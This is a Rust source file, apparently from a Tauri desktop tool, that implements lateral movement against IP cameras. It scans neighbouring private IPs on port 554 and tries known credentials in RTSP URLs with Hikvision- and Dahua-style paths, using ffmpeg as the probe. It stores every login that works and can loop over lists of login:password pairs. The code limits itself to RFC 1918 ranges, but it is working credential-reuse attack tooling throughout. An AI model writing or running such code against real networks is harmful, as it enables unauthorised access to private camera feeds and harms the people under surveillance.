use serde::Serialize;
use std::process::Stdio;
use std::time::Duration;
use tauri::State;
use tokio::net::TcpStream;

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct LateralMovementResult {
    pub neighbor_ip: String,
    pub is_alive: bool,
    pub creds_reused: bool,
    pub method: String,
    pub rtsp_path: Option<String>,
}

#[tauri::command]
pub async fn scan_lateral_movement(
    source_ip: String,
    known_login: String,
    known_pass: String,
    scan_range: Option<u8>,
    log_state: State<'_, crate::LogState>,
) -> Result<Vec<LateralMovementResult>, String> {
    if !is_private_ip(&source_ip) {
        return Err("Lateral movement разрешён только в приватных сетях (RFC 1918)".into());
    }

    let range = scan_range.unwrap_or(5).min(20);
    let neighbors = generate_neighbors(&source_ip, range);

    crate::push_runtime_log(
        &log_state,
        format!(
            "[LATERAL] Проверка {} соседей от {}",
            neighbors.len(),
            source_ip
        ),
    );

    let results = run_lateral_scan(&neighbors, &known_login, &known_pass).await;

    let reused = results.iter().filter(|r| r.creds_reused).count();
    crate::push_runtime_log(
        &log_state,
        format!("[LATERAL] Credential reuse: {}/{}", reused, results.len()),
    );

    Ok(results)
}

pub async fn check_neighbors(
    target_ip: &str,
    known_creds: Vec<String>,
) -> Result<Option<String>, String> {
    if !is_private_ip(target_ip) {
        return Ok(Some(
            "Пропуск: Боковое перемещение разрешено только в локальных сетях (RFC 1918)".into(),
        ));
    }

    let neighbors = generate_neighbors(target_ip, 2);

    for cred in known_creds {
        if let Some((login, pass)) = cred.split_once(':') {
            let results = run_lateral_scan(&neighbors, login, pass).await;
            let hits: Vec<String> = results
                .iter()
                .filter(|r| r.creds_reused)
                .map(|r| {
                    format!(
                        "Успешный вход на {} с кредами [{}:{}]",
                        r.neighbor_ip, login, "***"
                    )
                })
                .collect();
            if !hits.is_empty() {
                return Ok(Some(hits.join(" | ")));
            }
        }
    }

    Ok(None)
}

async fn run_lateral_scan(
    neighbors: &[String],
    known_login: &str,
    known_pass: &str,
) -> Vec<LateralMovementResult> {
    let ffmpeg = crate::get_ffmpeg_path();
    let mut results = Vec::new();

    for neighbor in neighbors {
        let alive = tokio::time::timeout(
            Duration::from_millis(500),
            TcpStream::connect(format!("{}:554", neighbor)),
        )
        .await
        .is_ok_and(|r| r.is_ok());

        if !alive {
            results.push(LateralMovementResult {
                neighbor_ip: neighbor.clone(),
                is_alive: false,
                creds_reused: false,
                method: "tcp_probe".into(),
                rtsp_path: None,
            });
            continue;
        }

        let test_urls = vec![
            format!(
                "rtsp://{}:{}@{}:554/Streaming/Channels/102",
                known_login, known_pass, neighbor
            ),
            format!(
                "rtsp://{}:{}@{}:554/cam/realmonitor?channel=1&subtype=1",
                known_login, known_pass, neighbor
            ),
        ];

        let mut creds_reused = false;
        let mut found_path = None;

        for url in &test_urls {
            if let Ok(Ok(status)) = tokio::time::timeout(
                Duration::from_secs(3),
                tokio::process::Command::new(&ffmpeg)
                    .args(crate::ffmpeg::FfmpegProfiles::probe(url))
                    .stdout(Stdio::null())
                    .stderr(Stdio::null())
                    .status(),
            )
            .await
            {
                if status.success() {
                    creds_reused = true;
                    found_path = Some(url.clone());
                    let km = crate::knowledge::KnowledgeManager::new();
                    km.save_success(neighbor, "auto_lateral", url, known_login, known_pass);
                    break;
                }
            }
        }

        results.push(LateralMovementResult {
            neighbor_ip: neighbor.clone(),
            is_alive: true,
            creds_reused,
            method: "rtsp_probe".into(),
            rtsp_path: found_path,
        });

        tokio::time::sleep(Duration::from_millis(300)).await;
    }

    results
}

fn is_private_ip(ip: &str) -> bool {
    let mut parts = ip.split('.');
    let a = parts.next().and_then(|v| v.parse::<u8>().ok());
    let b = parts.next().and_then(|v| v.parse::<u8>().ok());
    let c = parts.next().and_then(|v| v.parse::<u8>().ok());
    let d = parts.next().and_then(|v| v.parse::<u8>().ok());

    if parts.next().is_some() || a.is_none() || b.is_none() || c.is_none() || d.is_none() {
        return false;
    }

    match (a.unwrap(), b.unwrap()) {
        (10, _) => true,
        (172, 16..=31) => true,
        (192, 168) => true,
        _ => false,
    }
}

fn generate_neighbors(ip: &str, range: u8) -> Vec<String> {
    let mut neighbors = Vec::new();
    if let Some(dot_idx) = ip.rfind('.') {
        let prefix = &ip[..dot_idx];
        if let Ok(last) = ip[dot_idx + 1..].parse::<u16>() {
            let start = (last as i32 - range as i32).max(1) as u16;
            let end = (last + range as u16).min(254);
            for i in start..=end {
                if i != last {
                    neighbors.push(format!("{}.{}", prefix, i));
                }
            }
        }
    }
    neighbors
}
